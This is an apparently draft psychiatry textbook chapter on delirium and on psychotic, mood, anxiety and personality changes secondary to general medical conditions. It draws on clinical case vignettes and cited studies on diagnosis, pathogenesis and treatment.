In contrast, the DSM-IV categorizes delirium according to four very broad etiologies: delirium due to ''general medical condition''; ''substance intoxication'' delirium; ''substance withdrawal'' delirium; and delirium due to ''multiple etiologies''. Delirium related to substance intoxication or withdrawal will be discussed in Chapter (   ). 
The number of general medical conditions (GMCs) causing delirium is legion. Some common GMCs include ''fluid and electrolyte abnormalities, hypoglycemia, infection or sepsis, head trauma, hepatic encephalopathy, viral encephalitis, renal failure, COPD and brain tumor or hemorrhage.'' A plethora of both prescribed and over-the-counter medications can provoke delirium, including ''analgesics, antibiotics, cardiac medications, anticholinergic agents, psychotropic agents'', and a variety of ''botanicals'', such as jimsonweed. (Sadock &amp; Sadock, 2007)

	''Case vignette'': ''An 84 year-old woman with a history of mild congestive heart failure, osteoarthritis, and moderate cognitive impairment thought possibly due to very early DAT appeared confused, disoriented, and hallucinating. She complained of seeing &quot;green faces&quot; and was initially diagnosed as &quot;psychotic.&quot; Physical exam and routine laboratory measures were within normal limits. Her regular medication included digoxin 0.25 mg/day (digoxin level = 0.6 ng/ml; therap=0.5-2.0). Owing to her arthritic pain, she recently had been started on ibuprofen 400 mg tid.''
''A repeat digoxin level shortly after admission showed the level to be 1.2 ng/ml (WNL). An EEG showed slowing of alpha rhythm (7-8 Hz, normal=8-12). The increase in digoxin levels was attributed to the effect of the NSAID, ibuprofen (Goldfrank, 2002). Though the absolute level of digoxin was still within the normal range, its doubling  within a short period of time evidently set off the patient\’s confusion. Abnormal color perception—particularly in the green or yellow end of the spectrum (xanthopsia)—is a classic sign of digoxin toxicity (Piltz et al, 1993). ''

''Assessment and Diagnostic Testing''

''	''Delirium remains a clinical diagnosis'', ''with a careful ''history, physical exam, mental status exam, and review of medication and laboratory findings ''as the most useful diagnostic &quot;instruments&quot; (Sadock &amp; Sadock, 2007).  Typically, the onset of delirium is acute (over a period of hours, days, or in some cases weeks) and there is a marked change from the patient\’s &quot;baseline&quot; cognitive state. A recent change in medication; recent substance abuse/discontinuation; or some recent medical or neurological event (fall, infection, stroke, etc.) may provide the critical historical clues. The classic findings on mental status include a fluctuating level of consciousness (e.g., the patient &quot;nods off&quot; or drifts in and out of awareness); inability to pay attention to the examiner; disorientation to date and place (though intact orientation does ''not'' rule out delirium); impaired recent memory (e.g., inability to recall 3 of 3 items after 5 minutes); and associated features, such as disorganized thought processes (tangentiality, loose associations), perceptual abnormalities (auditory, and particularly, prominent ''visual'' or ''tactile'', hallucinations); and psychomotor abnormalities (agitation, slowing). Affect may be quite labile, and delusions may also be present. 
	When delirium is superimposed upon dementia, it appears that delirium phenomenology generally overshadows that of the dementia. Thus, delirium tends to present similarly regardless of whether it is accompanied by dementia. The clinical maxim should be, &quot;altered mental status reflects delirium until proven otherwise,&quot; in order to prevent misattribution of delirium to the more chronic brain syndrome of dementia (Trzepacz &amp; Meagher, 2008, p. 451). History from family members or caregivers may provide critical information suggesting a more acute change in functioning.
	''Physical examination'' may be difficult in an agitated, delirious patient, but every effort must be made to rule out head trauma, acute neurological events, and severe autonomic dysfunction (such as marked hypotension). Pulse, blood pressure, temperature, respirations should all be checked. An examination of the head and neck—including papillary function and extraocular movements—should be carried out. A basic assessment of heart, lungs, and neurological function should be obtained. Specific physical findings may provide a clue as to the etiology of the delirium. For example, a patient with ''papilledema and hypertension'' may be experiencing hypertensive encephalopathy; ''nuchal rigidity'' may point to meningitis or subarachnoid hemorrhage (Sadock &amp; Sadock). One helpful clue may be ''pupillary findings'': in cases of anticholinergic toxicity, pupils may be dilated but sluggish; in cases of &quot;hyper-adrenergic&quot; delirium (e.g., in sedative withdrawal, amphetamine/cocaine intoxication, or hyperthyroid storm), pupils may be dilated by briskly ''reactive'' (Ferner, 2003). 
	Adjunctive ''screening instruments'' for detecting delirium include the CAM (Confusion Assessment Method); the CTD (Cognitive Test for Delirium); and the DRS-R98 (Delirium Rating Scale, Revised 98). The CAM is probably the most widely used delirium screening test in general hospital settings, and is based on DSM-III criteria (Trzepacz &amp; Meagher, 2008). Recently, Fanjiang &amp; Folstein (2001) developed a simple screening scale for use by medical students, called the ''Three Item Delirium Scale''. This requires the presence of ''altered consciousness'' plus either ''cognitive impairment'' or ''hallucinations''; preliminary data suggest good sensitivity and specificity for delirium (Trzepacz &amp; Meagher, 2008). 
''	Laboratory measures and ancillary testing: ''There is no pathognomonic &quot;test&quot; for the diagnosis of delirium. However, it is important to obtain routine laboratory studies on all delirious patients, including—most urgently--complete blood count, electrolytes 
( including calcium, magnesium, and phosphate), renal and hepatic functions (including ammonia), serum glucose and erythrocyte sedimentation rate. Thyroid functions should also be checked. A blood and/or urine screen for drugs of abuse is helpful, and serologic tests for syphilis (such as VDRL) and HIV infection may also be indicated. An electrocardiogram (EKG) and chest radiograph are usually appropriate, in order to rule out cardiac arrhythmia, silent ischemia, or occult pneumonia among other causes. A bedside test for oxygenation is also useful. An electroencephalogram (EEG) is often advised as a standard study in the work up of delirium (Sadock &amp; Sadock, 2007), since the EEG often reveals either generalized slowing or focal areas of hyperactivity. (Serial EEGs may also be helpful in following the &quot;progress&quot; of treatment, in that one may see restoration of normal (8-12 Hz) alpha rhythm as the delirium resolves). Depending upon history and specific medical presentations, ancillary tests, such as lumbar puncture, blood cultures, B12 level, and structural brain imaging (CT, MRI) may be clearly indicated. It is important to note that correction of underlying metabolic, electrolyte, or other abnormalities does not necessarily lead to immediate resolution of the delirium; typically, there is a &quot;lag&quot; between such corrections and the patient\’s level of consciousness. This is particularly true in those circumstances where CNS drug levels (e.g. lithium) may normalize more slowly than blood levels; or when correction of blood abnormalities 
(such as high glucose or sodium) needs to occur slowly, in order to prevent CNS complications.  One should treat the ''patient'', not the &quot;lab slip&quot;! 
''Pathogenesis of Delirium''
Even though delirium may arise from a multitude of underlying causes, several unifying hypotheses have been advanced to explain the general mechanisms of most delirious states (Ferner, 2003). One such hypothesis emphasizes the balance between ''excitatory and inhibitory neurotransmission'' in the brain, and derives a broad separation of brain syndromes on this basis. For example, ''excitatory delirium syndromes'' may involve excessive augmentation of excitatory neurotransmitters, such as glutamate, dopamine and norepinephrine (serotonin may also be considered excitatory to some degree). Antagonism of certain cholinergic receptors, on this view, also constitutes an &quot;excitatory&quot; effect. Thus, delirium syndromes as diverse as amphetamine toxicity and poisoning with the anticholinergic agent benztropine would be predicted to have similar excitatory effects, including ''agitation, tachycardia, hypertension ''and ''fever.'' (Anticholinergic syndromes may present with the classic and memorable findings of &quot;hot as a hare, mad as a hatter, red as a beet, dry as a bone&quot;; i.e., ''fever, agitated confusion or psychosis; red skin; ''and'' dry mouth''). 
''Inhibitory delirium syndromes'', in Ferner\’s view (Ferner, 2003), involve agents that augment the inhibitory neurotransmitter, GABA, or act as agonists at the mu opioid receptor. Thus, in large quantities, GABA agonists such as benzodiazepines (and to some degree, ethanol) or opioids such as morphine may cause delirious states characterized by ''drowsiness, ataxia, respiratory suppression, ''and'' slurred speech.'' Pathological alterations in GABA activity--perhaps amplified by an endogenous toxin that binds to benzodiazepine receptors--have also been implicated in hepatic encephalopathy (Rummans et al, 1995). In some cases of inhibitory syndromes, &quot;paradoxical&quot; agitation may result from disinhibition of higher brain centers that normally suppress aggression or agitation (Ferner, 2003).
Another unifying hypothesis focuses specifically on ''low'' ''cholinergic ''and ''high dopaminergic transmission ''in delirium (Trzepacz &amp; Meagher, 2008),
as well as derangements in ''non-dominant, posterior parietal ''and'' prefrontal cortices.'' Other brain regions, including the brain stem, basal ganglia and thalamus, are likely to be involved. Importantly for the cholinergic hypothesis, a variety of disease states causing delirium are associated with cholinergic deficiency; e.g., thiamine deficiency, hypoxia, and hypoglycemia all ''reduce acetylcholine'' by affecting the oxidative metabolism of glucose and production of acetyl coenzyme-A (Trzepacz &amp; Meagher, 2008). 
The pathogenesis of delirium must also consider predisposing medical risk factors, though, as Trzepacz and Meagher note, these must not be confused with ''causes'' of delirium. Predisposing factors include but are by no means limited to: ''genetic risk factors'' (such as APOE4 genotype); ''old age''; ''pre-existing cognitive impairment; use of multiple medications'' (especially anticholinergic agents and opioids); ''pre-existing cerebrovascular accident/stroke''; and ''vitamin'' (especially thiamine) ''deficiency'' (Trzepacz &amp; Meagher, 2008). 
To some degree, psychological factors, as well as quality of hospital care, may also influence certain aspects of delirium. As Mohta et al (2003) have pointed out, the experience of being in the intensive care or trauma unit may activate various psychological defense mechanisms, such as denial, regression, anger, anxiety and depression. Delirium itself may, in some cases, represent a regressive defense, though  such psychodynamic hypotheses must never vitiate the clinician\’s search for specific physiological precipitants. 
The likelihood of delirium may also be influenced by the kind of care the patient receives. For example, Inouye and coworkers (1999) evaluated 852 hospitalized older patients who were nonrandomly assigned to usual care or management with a multi-pronged intervention designed to minimize risk factors for delirium. These protocols included repeated reorientation of the patient; provision of cognitively stimulating activities; a nonpharmacologic sleep protocol; early mobilization activities and range of motion exercises; timely removal of catheters and physical restraints; use of eyeglasses and hearing aids; and early correction of dehydration. These interventions significantly reduced the incidence of delirium (15.0% in the usual care group versus 9.9% in the intervention group). 

	''Treatment and Management of Delirium''

''		''The primary treatment of delirium entails diagnosing and correcting the ''underlying cause'' of the brain dysfunction. Thus, if an electrolyte disturbance appears to be the causal factor, one corrects it; if an infection seems to be &quot;driving&quot; the delirium, one treats it with appropriate anti-microbials (which may also provoke confusional states). If the patient\’s delirium appears due to a newly-prescribed medication, that agent is held or discontinued immediately, if clinically safe and feasible. (If one must avoid a superimposed withdrawal syndrome, the offending agent is tapered off and discontinued as rapidly as possible). 
There are some &quot;cause-specific&quot; agents that treat a few narrowly-defined types of delirium. For example, in cases of known or suspected anticholinergic-induced delirium, the cholinesterase inhibitor, ''physostigmine'', is indicated (and in the U.S., has FDA-approved labeling for this use). However, physostigmine is not without its own side effects, such as bradycardia. In cases of known or suspected alcohol withdrawal-related delirium (delirium tremens, &quot;DTs&quot;), a ''benzodiazepine'' is the treatment of choice (see Chapter ….). For benzodiazepine-induced delirium, limited data suggest that the benzodiazepine antagonist, ''flumazenil'', may be useful (Olshaker &amp; Flanigan, 2003). 
In many cases of delirium, a specific cause is not identified, or multiple causes are suspected. If, after a thorough medical evaluation, no specific etiology is found, one is left to &quot;manage&quot; the neurobehavioral complications of delirium as effectively and safely as possible—and without making matters worse. Unfortunately, many psychotropic agents used to manage the behavioral complications of delirium (such as agitation or disinhibted behavior) may themselves cause confusion or exacerbation of the delirium. Thus, treatment should be as conservative as possible, avoiding high doses, or agents whose mechanisms of action overlap with those of drugs implicated in causing the delirium. For example, the hallucinogen, phencyclidine (&quot;PCP&quot;, &quot;Angel Dust&quot;) has complex effects on acetylcholine (Helman &amp; Habal, 2006) that may be exacerbated if one treats PCP-induced psychosis with a highly anticholinergic phenothiazine. 
For management of neurobehavioral complications of delirium (marked agitation, aggression, tearing out IV lines, etc.), the agents of choice remain the higher-potency neuroleptics, particularly haloperidol (5-40 mg/day, in divided doses) (Inouye, 2006a). Although larger doses have been used intravenously, particularly in ICU or SICU settings, these agents have risk of producing torsades des pointe arrythmias, which have been associated with lethal ventricular arrythmias, particularly in patients with hypovolemia, hypomagnesemia or other electrolyte abnormalities. (Hassaballa &amp; Balk, 2003).  
There is, however, increasing interest in use of newer &quot;atypical&quot; antipsychotics in this setting, and some limited data suggest they may be safe and effective (Han &amp; Kim, 2004). Although benzodiazepines, such as lorazepam, are often administered to delirious patients, this group of agents carries significant risks in this population; e.g., paradoxical &quot;disinhibition,&quot; worsening, or prolongation of the patient\’s confusion (Inouye, 2006 a,b). With the exception of delirium tremens, there are few instances of delirium in which benzodiazpines would be indicated. 
There is also considerable interest in—but only preliminary evidence for—the use of ''cholinesterase inhibitors'' such as ''donepezil'' (see above, re: DAT) in delirium. Preliminary evidence has been mixed, and clinical observation suggests that any beneficial effects on confusion and memory impairment are modest and slowly-achieved (Jacobson et al, 2007). One recent controlled study (Liptzin et al, 2005) was &quot;…unable to demonstrate a benefit for donepezil in preventing or treating delirium in a relatively young and cognitively-intact group of elderly patients undergoing elective orthopedic surgery.&quot; 
''Non''-pharmacologic approaches to the delirious patient are an important part of good care, and include provision of &quot;orienting cues&quot;, such as clocks and calendars; continuity of nursing care; placement of familiar objects (such as a family picture) near the patient; and therapeutic use of friends and family to create a familiar and calming environment (Rummans et al, 1995). Finally, primary prevention of delirium involves a comprehensive strategy, including: 1) recognizing and mitigating known risk factors such as dehydration, sleep deprivation, hearing impairment, etc. (Inouye et al, 1999); 2) proactive geriatric consultation, prior to planned surgery; and 3) education of staff charged with the care of high-risk patients (Trzepacz &amp; Meagher, 2008). 

'''Psychiatric Symptoms Secondary to General Medical Conditions'''

''	''There is a complex and multidimensional relationship between psychiatric and medical illnesses. Psychiatric illness can be exacerbated by the presence of co-morbid medical illness and its management can be made more complex by pharmacologic or other management needs of medical illness. Psychiatric illness can present in general medical settings with medical symptoms secondary to psychiatric illness. Finally psychiatric disorders can be directly caused by the presence of known or occult medical/neurological illness.  In this section, we will focus on this last category. 
In the DSM-IV, this heterogeneous group of diagnoses comprises six main categories: ''psychotic disorders, mood disorders, anxiety disorders, catatonic disorders, personality alterations, ''and'' amnestic disorders''. In the ICD-10, the term &quot;organic&quot; is applied to the first five categories; e.g., ''organic hallucinosis ''and'' organic delusional disorder; organic mood \[affective\] disorder; organic anxiety disorder; organic catatonic disorder; ''and'' organic personality disorder''. We have already alluded to what we view as philosophical problems with the term &quot;organic&quot;. For this reason, we will use the neutral designation, ''psychiatric symptoms secondary to general medical conditions'' (Psy-GMCs) as a &quot;bridging&quot; term to encompass both the DSM and ICD categories. 

''Prevalence in selected settings''

''	''The community prevalence of psychiatric symptoms secondary to general medical conditions (Psy-GMCs) is not well-established, nor is it straightforward to determine. Data from a consultation-liaison service, however, provide some sense of how common Psy-GMCs may be in certain high-risk medical settings.  For example, Rundell and Wise (1989) reviewed  755 cases seen by the psychiatric C-L service in a general hospital.  Fully 38% of depressed patients had some underlying medical or neurological disorder as the likely cause of their depression. The most frequent diagnoses were cerebrovascular accident; Parkinson\’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis. With respect to manic syndromes on this C-L service, the findings were even more striking: ''87% of manic patients ''had a diagnosis of &quot;organic mood disorder.&quot; The most commonly-implicated causes of this &quot;secondary mania&quot; were corticosteroids, human immunodeficiency virus (HIV) infection, and temporolimbic epilepsy. Psychiatric clinic populations may also show a high prevalence of GMCs associated with psychiatric symptoms. Thus, Koranyi (1979) found that in a psychiatric clinic population, 18% had psychiatric symptoms that could be attributed solely to an underlying—and undetected—medical problem. On the other hand, in routine, non- general hospital, psychiatric inpatient settings, some types of Psy-GMCs may be quite rare. For example, Lo et al (2007) found that the prevalence of &quot;organic delusional disorder&quot; according to DSM-III-R criteria was only 0.4% of total inpatient psychiatric admissions. 

	''General features and phenomenology of Psy-GMCs''

''	''There are no pathognomonic signs that reliably distinguish  psychiatric disturbances due to general medical  (&quot;organic&quot;) conditions (Psy-GMCs) from those due to primary psychiatric disorders. For example, with respect to ''manifestations of the'' ''depression itself'', there are no singular objective features that would unequivocally distinguish, say, depression due to ''folic acid deficiency'' from depression seen in a typical ''major depressive episode''. However, careful attention to (1) the onset, history, and course of the present illness; (2) the patient\’s age, prior medical and psychiatric illnesses, and family history; as well as (3) accompanying physical and laboratory findings, may all be of help. 
For example, depressive, manic, anxious, or psychotic symptoms that appear to &quot;track with&quot; (correspond closely in time and intensity) the course of an underlying medical disorder may prove to be secondary to that disorder (see '''Case Vignette'''). Similarly, the onset of psychiatric symptoms following the introduction, discontinuation, or change in dosage of a particular drug should always raise the prospect of a &quot;secondary&quot; psychiatric syndrome. 
The ''mental status exam'' may provide clues as to the &quot;secondary&quot; nature of the psychiatric disturbance; e.g., unusual cognitive deficits (such as severe memory impairment) in a patient presenting with anxiety (Goldman, 1992). Abnormal findings on ''physical examination'' (such as hypo- or hyperactive reflexes, signs of vitamin deficiency, etc.) and ''laboratory testing'' (such as anemia, decreased thyroid function, etc.) may also be helpful in discerning an underlying GMC.  
On the other hand, correction of an underlying physical abnormality or drug toxicity does not always translate into an ''immediate'' remission of secondary psychiatric symptoms; often, there is a &quot;lag&quot; between correction of the underlying medical or drug-related problem and return to euthymia or baseline mental state. Indeed, as Colon and Popkin observe, sometimes—despite correction of the underlying medical problem—the secondary psychiatric symptoms may develop &quot;a life of their own&quot; and persist for long periods (Colon &amp; Popkin, 2006). Furthermore, as O\’Brien et al (2006) note, 

&quot;In some cases (eg, adrenal insufficiency), appropriate and continued treatment of the underlying condition results in resolution of the psychiatric symptoms. In others (eg, SLE), treatment of the underlying condition may alleviate but may also exacerbate psychiatric symptoms.&quot;

''Advanced age, or older age of onset of psychiatric illness '' is sometimes a clue to an underlying GMC, though by no means an infallible one. Since the elderly (as well as the very young) are at greater risk for medical illnesses generally, the sudden appearance of apparent psychiatric symptoms in someone over the age of 55 ought to trigger a search for underlying medical factors (though one could say the same for a younger patient with a similarly abrupt onset of psychiatric illness). One\’s level of suspicion is generally highest in an ''older'' patient whose ''family history'' is &quot;negative&quot; for psychiatric disorders, and whose symptoms appear ''temporally linked to a GMC or drug-related event''. In this regard, Lo et al (2007) reported that compared to patients with (functional) Delusional Disorder, those with &quot;Organic Delusional Disorder&quot; usually had an older age of onset, and less frequently had a relevant family psychiatric history. Similarly, patients diagnosed with &quot;organic mood disorder&quot; were more likely to have a negative family history of depression, compared to medically-ill patients with a diagnosis of major depression (Yates et al, 1991). The patients with organic mood disorder were also less likely than their counterparts to have recovered fully after four years, despite similar treatment as those with major depression. As noted above, patients with older age at onset of affective illness, and without family history of depression, are more likely to have evidence of vascular CNS abnormalities on MRI than those with earlier onset illness.
With respect to temporal patterns, an important caveat is in order here: as Colon and Popkin (1996) judiciously observe:
&quot;Many clinicians are inclined to rely heavily on a temporal relation to establish an organic etiological relation. Although temporal relation is an instructive parameter, it may be misleading and subject to errors of recall. It is also apparent that psychiatric symptoms may antedate the clinical recognition of the physical illness—that is, anxiety and depression may be the first presenting features of a medical illness.&quot; (p. 413)
	Sometimes, the &quot;phenomenology&quot; of the syndrome may provide a clue as to its etiology, though this is far from universally the case. For example, when ''psychotic symptoms'' develop in the context of a GMC, they tend to present in a characteristic pattern. Thus, many secondary psychotic syndromes are characterized by paranoid delusions, persecutory thoughts, and ideas of reference. Delusions tend to be ''concrete and changeable'', in contrast to the often elaborate, bizarre, and relatively stable delusions seen in, say, schizophrenia or mania. Lishman characterizes &quot;organic delusions&quot; as often ''persecutory'' in content, but typically &quot;…poorly elaborated, vague, transient, and inconsistent…&quot; (Lishman, 1998, p. 11). So, for example, the elderly patient in a nursing home who develops an &quot;organic psychosis&quot; may say, on Monday, &quot;The nurses are trying to poison me.&quot; On Tuesday, the same patient may have no particular fears regarding the nurses, but may complain, &quot;My roommate is stealing my jewelry.&quot;  However, in organic delusional syndromes ''without clouding of consciousness'', Lishman notes that &quot;…the delusions may be more coherently organized, with a picture more closely resembling schizophrenia.&quot; 
	With respect to GMCs associated with anxiety, Colon and Popkin (1996) note that, &quot;…there are few current data to indicate whether panic emerging in the medical patient differs from that seen in the primary psychiatric setting. In addition, no data are available about factors such as course and onset in the medical setting.&quot; One exception is the finding by Starkman et al (1985) showing that in patients (N=17) with pheochromocytoma—a GMC long-associated with anxiety-- none described the severe apprehension or fear characteristic of panic attacks, and ''none described agoraphobia.'' 
	Depression in the medical setting is comprehensively reviewed by Rouchell et al (1996). Again, there are no pathognomonic signs that clearly point to &quot;secondary&quot; or &quot;organic&quot; depressive symptoms. In addition, the standard diagnostic criteria for major depression in DSM-IV have not been normed for individuals with co-morbid medical illness. However, Goldman (1992) offers the following clues suggesting an underlying medical cause: ''an atypical clinical picture; resistance to standard treatments; unexplained personality changes; and subtle cognitive findings on mental status exam''. 
	The course of Psy-GMCs depends to a large degree on the nature of the underlying medical condition and how responsive it is to primary treatment. The course is also influenced by the extent and success of symptomatic psychiatric treatment. For example, when there is a progressive or intermittently active degenerative CNS process at work, such as multiple sclerosis, course and outcome are likely to be less favorable. On the other hand, psychiatric symptoms due to acute anticholinergic toxicity may be resolved within a matter of hours, if diagnosis and treatment proceed expeditiously.

In the DSM-IV, ''Psychotic Disorder Due to GMC'' is sub-typed based on the predominant symptom; i.e., &quot;with delusions&quot; or &quot;with hallucinations&quot;. Of course, the two often occur together. The DSM-IV also specifies that the symptoms must not occur exclusively while the patient is ''delirious'', or be better explained by another mental disorder. 
Although a plethora of medical and neurological conditions may produce psychotic symptoms, particular attention should be focused on disorders affecting the ''occipital'' and ''temporal'' regions. For example, cerebral tumors in these regions may produce hallucinations in various modalities, as well as delusions (Sadock &amp; Sadock, 2007). The differential diagnosis of &quot;psychosis&quot; is therefore extremely important. In one study (Malmud, 1967) 6 of 11 patients with temporal lobe tumors initially presented with a diagnosis of ''schizophrenia, ''though other studies of patients with temporal lobe tumors have shown much lower rates of psychotic symptoms . ''Complex partial seizures'' originating in the temporal or frontal regions may also  produce psychotic-like symptoms, as well as olfactory or gustatory hallucinations. ''Substance-induced psychotic disorders'' are discussed in Chapter (    ). 

''Case vignette: Ms. A, a 38-year-old white female with long history of vague medical problems, was brought to emergency room by her family because she had boarded up all the windows at her house and refused to come outside. The patient claimed her neighbors were &quot;spying&quot; on her and &quot;want to do me in.&quot; She was fully oriented, and both recent and remote memory intact. There was no fluctuation in her level of consciousness. The patient denied any unusual perceptual changes, auditory, visual, or tactile hallucinations. Physical examination was essentially normal. However, laboratory studies revealed normocytic anemia, leukopenia, and red cell casts in urine. Subsequent testing for antinuclear antibody (ANA) was strongly positive; a provisional diagnosis of systemic lupus erythematosus (SLE) with cerebral involvement (&quot;lupus cerebritis&quot;) was made. ''

''Mood disorder due to general medical condition	''


''	''The DSM-IV recognizes four main subtypes of mood disorder due to a GMC: ''with depressive features; with major-depressive like episode; with manic features; ''and'' with mixed features. ''The ICD-10 uses a slightly different scheme, differentiating ''organic manic disorder; organic bipolar disorder; organic depressive disorder; ''and'' organic mixed affective disorder. ''
As with the psychoses due to GMCs, secondary mood disorders may stem from a multitude of underlying medical and neurological conditions. In consultation-liason settings, as noted earlier, the most frequent underlying GMCs were cerebrovascular accident (including stroke); Parkinson\’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis (Rundell &amp; Wise, 1989). Post-stroke depression merits special attention, in that as many as 50% of all post-stroke patients experience depressive illness. A similar percentage applies to patients with pancreatic cancer, and to about 40% of patients with Parkinson\’s Disease (Sadock &amp; Sadock, 2007). However, the diagnosis of depression in the medical setting is complicated by the substantial overlap between ''somatic symptoms'' related to the underlying GMC, and ''neurovegetative symptoms'' of depression (for review, see Harnett, 2001). For example, some data (Musselman et al, 1998) indicate that major depression is seen in approximately 15-20% of patients with coronary (ischemic) heart disease (IHD). However, depression may sometimes be over-diagnosed in this population if &quot;lethargy&quot; or &quot;apathy&quot; ''secondary to congestive heart failure'' is inappropriately counted as signifying major depression. There may also be over-diagnosis of depression in IHD patients who have become &quot;demoralized&quot;—but not clinically depressed—about their medical setbacks (Harnett, 2001). 
Indeed, the pathophysiological relationship between underlying medical illness and mood disorder is quite complex. For example, it is not always clear to what degree a depressed medical patient may be &quot;reacting psychologically&quot; to the incapacity stemming from a GMC; or experiencing subtle but direct ''biochemical and immunological effects on the brain'', stemming from the GMC (Harnett &amp; Pies, in press). One illustration of this is in the area of IHD. Depression-related immune dysfunction may worsen IHD via inflammatory cytokines (e.g., interleukin-6, tumor necrosis factor alpha). But IHD-related immune abnormalities may also contribute to depression (Kop et al, 2005). Moreover, social isolation, psychosocial stress, and low levels of perceived support are related to ''both ''depression ''and'' IHD, and could mediate bidirectional effects on these conditions (Barth et al, 2004; Lett et al, 2004). However depression is a well-established risk factor for increased mortality in post-myocardial infarction patients. In short, there are very complex relationships between underlying medical illness and the appearance of depressive symptoms. 
This is also true, to some degree, with ''medication-related'' mood alterations. Establishing a causal connection between ingestion of a particular drug and the development of clinical depression is far from straightforward, notwithstanding epidemiological evidence linking some drugs with depression (Rogers and Pies, 2008). Although often mentioned as causes of drug-induced depression, ''beta blockers'' and ''calcium channel blockers'' are only weakly-linked with this side effect. In contrast, some medications—such as ''alpha-interferon'' and ''isotretinoin''—do appear strongly, if not causally, linked with new- onset depression (Bonaccorso et al, 2002; Wysowski et al, 2001) 

		''Case vignette'': ''Mr. A., a 65-year-old married male without prior psychiatric history presented with a one month history of &quot;feeling really down.&quot; He also related that, for the past three weeks or so, he had experienced vague gastrointestinal distress; decreased appetite; and a 15-lb weight loss. One month earlier, a close friend had died after a long illness, and Mr. A. attributed his sadness to this recent loss. Mental status exam was notable for a pale, cachectic individual whose affect appeared somewhat blunted, with occasional tearfulness. Cognitive examination was essentially within normal limits. Physical examination revealed an enlarged, non-tender gallbladder, and slight jaundice. Urinary amylase levels were elevated. A CT scan of the abdomen revealed cancer of the head of the pancreas with obstruction of the gallbladder. ''

''Anxiety disorder due to general medical condition     ''
''       ''
''	''The DSM-IV defines three main subtypes of anxiety disorder due to GMC: with ''generalized anxiety'', with ''panic attacks'', and with ''obsessive-compulsive'' symptoms. Although the overall prevalence of anxiety due to GMCs is not known, there is substantial evidence that medically-ill individuals have higher rates of anxiety than does the general public (Sadock &amp; Sadock, 2007). For example, one study of patients with Parkinson\’s disease found that 38% of patients received a current DSM-III-R anxiety disorder diagnosis, including panic disorder, generalized anxiety disorder, and social phobia (Stein et al, 1990). Importantly, severity of anxiety was not correlated with severity of parkinsonian symptoms, cumulative duration of L-dopa exposure, or current dose of L-dopa. Similarly, among diabetic patients, the lifetime prevalence rates for phobic disorders and generalized anxiety disorders were 26.5% and 41%, respectively (Lustman et al, 1986). 
 As with other categories of secondary psychiatric symptoms, anxiety due to GMCs may stem from many underlying causes, as shown in '''Table 3'''.  ''Endocrinopathies''—notably, hyperthyroidism, hypo- and hyperparathyroidism, and pheochromocytoma—are commonly associated with anxiety (as well as with depression). ''Cardiac arrythmias'' may be both the cause, and the result, of anxiety, sometimes leading to a &quot;vicious cycle&quot;. For example, an individual with underlying heart disease who develops a &quot;run&quot; of supraventricular tachycardia may become very anxious upon experiencing the sensation of &quot;palpitations&quot;, and thereby exacerbate or prolong the tachycardia. Although ''mitral valve prolapse'' is mentioned in older textbooks as a cause of anxiety (especially panic attacks), the evidence for this link is actually tenuous. One recent review (Filho et al, 2008) concluded that, &quot;the more elaborate the study methodology, the lower the chance to observe a significant relationship between these (two) conditions.&quot;  
A number of degenerative brain diseases may be associated with marked anxiety, including Alzheimer\’s Disease (DAT), Wilson\’s Disease, and Huntington\’s Disease. The frequency of anxiety in patients with DAT averages 48%, versus about 6% in elderly patients without DAT (Mega et al, 1996; Apostolova &amp; Cummings, 2008). 
The list of ''medications'' causing anxiety is very extensive, and includes bronchodilators, thyroid preparations, theophylline, psychostimulants (such as methylphenidate), antipsychotics, and antidepressants. A variety of over-the-counter remedies, such as antihistamines and herbal preparations, may also trigger or exacerbate anxiety. Recently, anxiety, tachycardia, and even seizures have been linked with various &quot;energy drinks&quot; containing high concentrations of caffeine (Clauson et al, 2008).

'' case vignette:  A 67 year-old. bedridden female was brought to the emergency room by her son. The patient had been experiencing severe anxiety for the past two hours. She was alert and oriented, but appeared extremely anxious and tremulous.  Her breathing was rapid and patient complained of palpitations and lightheadedness.  She had learned the day before that she was facing eviction from her apartment. The provisional diagnosis was &quot;Panic attack with hyperventilation, precipitated by threat of eviction.&quot;  Physical exam was notable for a pulse of 120; diaphoresis; and localized wheezes upon auscultation of the chest. A chest radiograph was within normal limits. However, a perfusion scintiscan of the lung revealed acute pulmonary embolus, and the patient was immediately hospitalized.  ''

''Personality change due to general medical condition ''


DSM-IV recognizes five main subtypes of personality change due to general medical condition (PC-GMC); i.e., ''labile, disinhibited, aggressive, apathetic'', and'' paranoid.'' However, &quot;other&quot; &quot;combined&quot; and &quot;unspecified&quot; subtypes allow for the almost infinite variations and combinations of personality alterations that may be observed clinically. The older term &quot;organic personality syndrome&quot; also subsumes these categories. 
A variety of medical and neurological conditions may lead to alterations in the individual\’s usual personality, temperament, or life-long character traits. According to Reid (1989), the most common causes of PC-GMC (&quot;organic personality syndrome&quot;) are ''head trauma, cerebrovascular accident, ''and'' space-occupying intracranial lesions''. Other common causes include temporal lobe epilepsy, multiple sclerosis, chronic intoxications, endocrine disorders, and CNS infections such as neurosyphilis. 
It is useful to focus on personality alterations due to lesions or dysfunction in ''frontal-subcortical circuits'' and within the ''temporal lobes.''  Tekin &amp; Cummings (2002) have identified five parallel frontal-subcortical circuits that link specific areas of the ''frontal cortex'' to the striatum, basal ganglia and thalamus. Lesions originating in the ''orbitofrontal'' region lead to personality changes characterized by ''disinhibition''; e.g., the patient begins to use profanity or exhibit sexually provocative behaviors. Lesions originating in the ''anterior cingulate ''portion of the frontal cortex produce an ''apathetic'' picture; e.g., a once outgoing and vociferous individual becomes withdrawn, indifferent, and uninterested in his usual activities. 
Lesions or abnormal electrical activity in the temporal lobes also produce alterations in personality. For example, in temporal lobe epilepsy, the most common psychiatric abnormality is personality change (Chuang, 2006). Hyperreligiosity, hypergraphia, and hyposexuality are reportedly more common in patients with temporal lobe epilepsy than with other forms of epilepsy (Chuang, 2006), though not all neurologists accept this view. Tumors within or impinging upon the temporal lobes may also produce alterations in personality, including irritability, hypochondriasis, or an accentuation of neurotic traits. Some of these alterations may actually reflect temporal lobe epilepsy secondary to the tumor (Lishman, 1998).

